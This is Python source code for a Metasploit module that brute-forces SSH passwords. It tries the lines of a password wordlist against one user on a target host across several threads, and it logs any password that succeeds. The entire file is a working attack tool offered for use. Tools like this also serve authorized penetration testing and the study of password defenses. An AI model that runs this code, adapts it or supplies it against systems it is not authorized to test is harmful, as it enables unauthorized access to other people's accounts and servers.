#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging
from threading import Thread
import queue,linecache,time


dependencies_missing = False
try:
    import paramiko
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'SSH_BurteForce_login',
    'description': '''
        Python communication with msfconsole.
    ''',
    'authors': [
        'HZzz2'
    ],
    'date': '2022-05-20',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://blog.rapid7.com/2017/12/28/regifting-python-in-metasploit/'},
        {'type': 'aka', 'ref': 'Coldstone'}
    ],
    'type': 'ssh_scanner',
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type':'port','description':'Target port','required':True,'default':22},
        'user_name':{'type':'string','description':'SSH user name','required':True,'default':'hzzz2'},
        'file':{'type':'path','description':'Password dict','required':True,'default':None},
        'thread':{'type':'int','description':'SSH Bruteforce Thread number','required':True,'default':5}
    }
}

class BruteForce:
    def __init__(self, host, user, filename,thread_num,q,qw):
        self.host = host
        self.user = user
        self.filename = filename
        self.thread_num = thread_num
        self.q = q
        self.qw = qw

    def run_thread(self):
        self.filelines = self.get_filelines(self.filename)
        self.thread_list = []
        self.one_lines = int(self.filelines/self.thread_num)
        self.remain_lines = self.filelines - self.one_lines*self.thread_num
        self.thread_list = []
        self.numberlines = 1
        filename_t = self.filename
        for i in range(self.thread_num):
            if i == self.thread_num-1:
                lines = self.one_lines + self.remain_lines
            else:
                lines = self.one_lines
            host_t = self.host
            user_t = self.user
            thread = Thread(target=self.bruteforce, args=(filename_t,self.numberlines,self.numberlines+lines,host_t,user_t,self.q,self.qw),daemon=True)
            self.numberlines += lines
            thread.start()
            self.thread_list.append(thread)
        return self.thread_list

    def bruteforce(self,filename_t,numberlines,lines,host_t,user_t,q,qw):
        policy_t = paramiko.AutoAddPolicy()
        for i in range(numberlines,lines):
            line = linecache.getline(filename_t, i).strip()
            qw.put(line)
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(policy_t)
                client.connect(host_t, username=user_t, password=line,banner_timeout=84600,timeout=84600,auth_timeout=84600)
                q.put(line)   
                logging.info(f'[+] {line} is correct')
                client.close()
                break
            except:
                logging.info(f'[-] {line} is not correct')
            finally:
                client.close()
        linecache.clearcache()

    def get_filelines(self,filename):
        lens = len(linecache.getlines(self.filename))
        linecache.clearcache()
        return lens

def get_time(start_time,end_time):
    spend = end_time - start_time
    if spend <= 60:
        spend = str(round(spend,2)) + ' s'
    elif spend > 60 and spend <= 3600:
        spend = str(round(spend/60,2)) + ' minutes'
    elif spend > 3600 and spend <= 86400:
        spend = str(round(spend/3600,2)) + ' hours'
    elif spend > 86400:
        spend = str(round(spend/86400,2)) + ' days'
    return spend

def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
  
    if dependencies_missing:
        logging.error('Module dependency (paramiko) is missing, cannot continue,# pip3 install paramiko')
        return

    try:
        q = queue.Queue()
        qw = queue.Queue()
        bf = BruteForce(args['rhost'], args['user_name'], args['file'], int(args['thread']),q,qw)
        start_time = time.time()
        thread_list = bf.run_thread()
        thread_join = 0
        while True:
            if not q.empty():
                logging.info('\033[0;36m++++找到密码了 \033[0m')
                logging.info(f'\033[0;36m++++SSH PassWord：{q.get()}  Time: {get_time(start_time,time.time())} \033[0m')
                return
            for i in thread_list:
                logging.info(i.getName())
            for i in thread_list:
                if not i.is_alive():
                    thread_join += 1
                    if thread_join == args['thread']:
                        logging.error(f'[!] Brute force finished\n[!] SSH password not found\nTime: {get_time(start_time,time.time())}')
                        return
                else:
                    break
            thread_join = 0
    except Exception as e:
        logging.error('{}'.format(e))
        return

if __name__ == '__main__':
    module.run(metadata, run)
